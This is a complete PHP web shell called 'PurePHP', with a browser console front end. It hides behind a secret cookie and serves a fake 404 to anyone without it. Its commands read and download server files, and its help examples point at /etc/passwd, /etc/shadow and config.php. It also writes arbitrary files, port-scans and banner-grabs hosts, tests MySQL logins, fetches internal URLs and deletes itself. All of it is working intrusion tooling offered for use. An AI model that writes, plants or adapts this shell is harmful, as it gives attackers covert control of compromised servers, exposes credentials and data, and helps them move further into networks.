<?php
# Author: dund3rpwn
$cookie_name  = "sessId";
$secret_value = "7f88219c9e83a696";

if (!isset($_COOKIE[$cookie_name]) || $_COOKIE[$cookie_name] !== $secret_value) {
    header('HTTP/1.1 404 Not Found');
    echo "<h1>Not Found</h1><p>The requested URL was not found on this server.</p>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    $input = trim($_POST['act']);
    $p = explode(' ', $input);
    $action = $p[0];
    $target = $p[1] ?? '.';
    $arg1 = $p[2] ?? '';
    $arg2 = $p[3] ?? '';
    $out = "";

    switch ($action) {
        case 'get':
            if (is_readable($target) && !is_dir($target)) {
                while (ob_get_level()) ob_end_clean();
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($target).'"');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            } else { $out = "Target unreadable."; }
            break;

        case 'dir':
            $out = is_dir($target) ? implode("\n", scandir($target)) : "Not found.";
            break;
        case 'read':
            $out = is_readable($target) ? file_get_contents($target) : "Access denied.";
            break;
        case 'put':
            $out = file_put_contents($target, base64_decode($arg1)) !== false ? "Commit OK." : "Error.";
            break;
        case 'find':
            $found = [];
            try {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target));
                foreach ($it as $f) { if (strpos($f->getFilename(), $arg1) !== false) $found[] = $f->getPathname(); }
                $out = empty($found) ? "No results." : implode("\n", $found);
            } catch (Exception $e) { $out = "Error."; }
            break;
        case 'stat':
            if (!file_exists($target)) { $out = "Invalid."; break; }
            $out = "Path: ".realpath($target)."\nR/W: ".(is_readable($target)?'Y':'N')."/".(is_writable($target)?'Y':'N');
            if (function_exists('posix_getpwuid')) $out .= "\nOwner: ".posix_getpwuid(fileowner($target))['name'];
            break;
        case 'scan':
            $hp = explode(':', $target);
            $c = @fsockopen($hp[0], $hp[1] ?? 80, $en, $es, 2);
            $out = $c ? "Port ".($hp[1]??80)." open on ".$hp[0] : "Closed.";
            if ($c) fclose($c);
            break;
        case 'banner':
            $hp = explode(':', $target);
            $c = @fsockopen($hp[0], $hp[1] ?? 21, $en, $es, 3);
            if ($c) {
                if (($hp[1]??21) == 445) { fwrite($c, "\x00"); $b = bin2hex(fread($c, 512)); }
                else { $b = fread($c, 1024); }
                fclose($c); $out = trim($b);
            } else { $out = "Service unreachable."; }
            break;
        case 'db_test':
            $hp = explode(':', $target);
            $db = @new mysqli($hp[0], $arg1, $arg2, '', $hp[1] ?? 3306);
            $out = $db->connect_errno ? "Failed: ".$db->connect_error : "Connected as $arg1";
            if (!$db->connect_errno) $db->close();
            break;
        case 'dns':
            if (filter_var($target, FILTER_VALIDATE_IP)) { $h = gethostbyaddr($target); $out = $h ? $h : "No PTR."; }
            else { $ip = gethostbyname($target); $out = $ip === $target ? "Failed." : $ip; }
            break;
        case 'fetch':
            $ch = curl_init($target);
            curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_TIMEOUT=>5, CURLOPT_USERAGENT=>'Mozilla/5.0']);
            $res = curl_exec($ch); $out = $res ?: curl_error($ch); curl_close($ch);
            break;
        case 'self_destruct':
            if ($target === 'DELETEME') {
                if (@unlink(__FILE__)) { $out = "Utility successfully removed."; }
                else { $out = "Error: Permission denied."; }
            } else { $out = "WARNING: self_destruct requires parameter 'DELETEME'."; }
            break;
        case 'help':
            $m = [
                ['dir [path]', 'List directory', 'dir /var/www/html'],
                ['read [file]', 'Read text file', 'read /etc/passwd'],
                ['get [file]', 'Binary download', 'get config.php'],
                ['put [path] [b64]', 'Write file', 'put /tmp/t.txt b64_str'],
                ['find [path] [key]', 'Search names', 'find /var/www flag'],
                ['stat [path]', 'Check perms', 'stat /etc/shadow'],
                ['scan [h:p]', 'Port check', 'scan 127.0.0.1:3306'],
                ['banner [h:p]', 'Svc Probe', 'banner 1.1.1.1:22'],
                ['db_test [h:p] [u] [p]', 'MySQL Auth', 'db_test 127.0.0.1 r p'],
                ['dns [target]', 'DNS Lookup', 'dns 8.8.8.8'],
                ['fetch [url]', 'HTTP Request', 'fetch http://int.site'],
                ['clear', 'Clear console', 'clear'],
                ['self_destruct DELETEME', 'Kill script', 'self_destruct DELETEME']
            ];
            $out = str_pad("COMMAND", 25) . str_pad("DESCRIPTION", 30) . "EXAMPLE\n";
            $out .= str_repeat("-", 85) . "\n";
            foreach($m as $i) $out .= str_pad($i[0], 25) . str_pad($i[1], 30) . $i[2] . "\n";
            break;
        default: $out = "Unknown action.";
    }
    echo json_encode(['output' => nl2br(htmlentities($out, ENT_QUOTES | ENT_HTML5, 'UTF-8')), 'user' => get_current_user(), 'cwd' => getcwd(), 'ip' => $_SERVER['SERVER_ADDR'] ?? '127.0.0.1']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PurePHP</title>
    <style>
        body { background: #121212; color: #e0e0e0; font-family: 'Consolas', monospace; font-size: 13px; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        #header { background: #1e1e1e; padding: 10px 15px; border-bottom: 1px solid #333; color: #4caf50; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
        #out { padding: 15px; flex-grow: 1; overflow-y: auto; white-space: pre-wrap; scroll-behavior: smooth; }
        .bar { background: #1e1e1e; border-top: 1px solid #333; padding: 8px 15px; display: flex; box-sizing: border-box; }
        input { background: transparent; border: none; color: #4caf50; width: 100%; outline: none; font-family: inherit; font-size: inherit; }
        button { background: #333; color: #ccc; border: 1px solid #444; font-size: 11px; cursor: pointer; padding: 4px 10px; border-radius: 3px; }
        button:hover { background: #444; color: #fff; }
    </style>
</head>
<body>
    <div id="header">
        <div>USER: <?php echo get_current_user(); ?> | IP: <?php echo $_SERVER['SERVER_ADDR'] ?? '127.0.0.1'; ?> | CWD: <span id="cwd-display"><?php echo getcwd(); ?></span> | PurePHP</div>
        <button onclick="exportLog()">Export Log</button>
    </div>
    <div id="out">PurePHP [Ready]
Type 'help' for service utility list.</div>
    <div class="bar">
        <span style="color:#888; margin-right:10px;">#</span>
        <input type="text" id="in" autocomplete="off" autofocus>
    </div>

    <script>
        const input = document.getElementById('in');
        const out = document.getElementById('out');
        const cwdDisplay = document.getElementById('cwd-display');

        function exportLog() {
            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const blob = new Blob([out.innerText], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `console_log_${timestamp}.txt`;
            a.click();
        }

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const val = input.value;
                if (val.trim() === 'clear') { out.innerHTML = 'Console cleared.\n'; input.value = ''; return; }
                
                out.innerHTML += `\n<span style="color:#777"># ${val}</span>\n`;
                const p = new URLSearchParams();
                p.append('act', val);

                fetch('', { method: 'POST', body: p })
                .then(res => {
                    const disp = res.headers.get('Content-Disposition');
                    if (disp && disp.indexOf('attachment') !== -1) {
                        return res.blob().then(blob => {
                            const url = window.URL.createObjectURL(blob);
                            const a = document.createElement('a'); a.href = url;
                            a.download = disp.split('filename=')[1].replace(/"/g, '') || 'file';
                            document.body.appendChild(a); a.click(); a.remove();
                            return { output: "Binary download completed." };
                        });
                    }
                    return res.json();
                })
                .then(data => {
                    if (data.output) out.innerHTML += data.output + "\n";
                    if (data.cwd) cwdDisplay.innerText = data.cwd;
                    input.value = '';
                    out.scrollTop = out.scrollHeight;
                });
            }
        });
    </script>
</body>
</html>
